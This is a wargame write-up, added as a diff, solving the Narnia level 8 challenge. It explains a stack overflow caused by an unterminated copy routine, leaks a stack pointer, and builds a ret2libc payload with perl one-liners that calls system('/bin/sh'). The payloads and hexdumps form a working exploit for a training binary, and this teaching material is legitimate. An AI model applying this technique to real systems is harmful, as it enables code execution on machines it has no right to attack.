@@ -1,0 +1,39 @@
+This program calls func(), which basically contains a ghetto strcpy. The issue is that the pointer to where we're
+reading from is stored on the stack before the return address. The ghetto strcpy also doesn't NULL terminate the copied
+data, so in order to gain write access to the rest of the stack, we can leak this pointer, increment it to accomodate the
+size of our payload, and then insert it into our payload so it's written over with itsself.
+
+func() returns to 0x080484a7. This is stored 2 words after our input pointer, which is stored 5 words past the start of our
+stack write. So our first "payload" will be "A" x 20. We'll dump this to /tmp/hex and hexdump it.
+
+    narnia8@narnia:/narnia$ ./narnia8 $(perl -e 'print "A" x 20') > /tmp/hex
+    narnia8@narnia:/narnia$ xxd -e /tmp/hex
+    00000000: 41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
+    00000010: 41414141 ffffd8ad ffffd6e8 080484a7  AAAA............
+    00000020: ffffd8ad       0a                    .....
+
+Our payload will be
+    20 x filler
+    4 x read addr
+    4 x filler
+    4 x system() addr
+    4 x func ret addr
+    4 x "/bin/sh" addr
+    = 40 byte len
+
+system @ 0xf7e4c850
+ret @ 0x0804848f
+"/bin/sh" @ 0xf7f6ecc8
+
+We'll go into GDB again and get read addr for 20 and 40 length inputs to calculate the offset we need.
+    20: 0xffffd88f
+    40: 0xffffd87b
+
+As expected, we just need to decrease the leaked pointer by 20 to get the pointer for a 40 byte input.
+
+    GDB test payload: perl -e 'print "A" x 20 . "\x7b\xd8\xff\xff" . "AAAA" . "\x50\xc8\xe4\xf7" . "\x8f\x84\x04\x08" . "\xc8\xec\xf6\xf7"'
+
+Our test payload works, so now we'll get our real address by subbing 20 from the leaked one: 0xffffd899
+
+    payload: perl -e 'print "A" x 20 . "\x99\xd8\xff\xff" . "AAAA" . "\x50\xc8\xe4\xf7" . "\x8f\x84\x04\x08" . "\xc8\xec\xf6\xf7"'
+
